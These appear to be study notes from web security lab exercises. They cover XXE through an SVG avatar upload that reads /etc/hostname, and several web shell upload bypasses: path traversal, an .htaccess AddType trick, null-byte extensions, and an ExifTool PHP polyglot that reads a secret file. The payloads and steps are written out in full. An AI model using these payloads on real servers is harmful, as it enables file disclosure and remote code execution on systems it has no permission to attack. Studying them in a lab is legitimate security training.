## XXE Vulnerabilities:  
-  ==Exploiting XXE via image file upload==  Save the following payload as a.svg file and upload as an avatar image in blog comment section:
``` 
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

## File Upload Vulnerabilities:
- ==Web shell upload via path traversal==
  Intercept POST /my-account/avatar   and change the filename=../image.php
  for path traversal, but this gets blocked so the slash must be URL-encoded to  filename=..%2fimage.php
  Then access the secret in GET /files/image.php
- ==Web shell upload via extension blacklist bypass== 
   Send a POST /my-account/avatar request with the filename set as filename=".htaccess" and Content-Type: text/plain and the body as AddType application/x-httpd-php .food (a custom extension type, can be anything)   
   
   This maps an arbitrary extension (.food) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already. 
   
   Upload the php file but rename it as image.food in the filename parameter
   
   View the image to obtain the secret
- ==Web shell upload via obfuscated file extension==
  Add semicolons or URL-encoded null byte characters before the file extension e.g.: image.php%00.jpg - then this is uploaded as image.php (although the filename value is kept as the exact string, the actual file that is uploaded is image.php) Access  image.php to get the secret
- ==Remote code execution via polyglot web shell upload==
   Create an image using ExifTool 
   
   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
   
   Submit and view image and look for START and END markers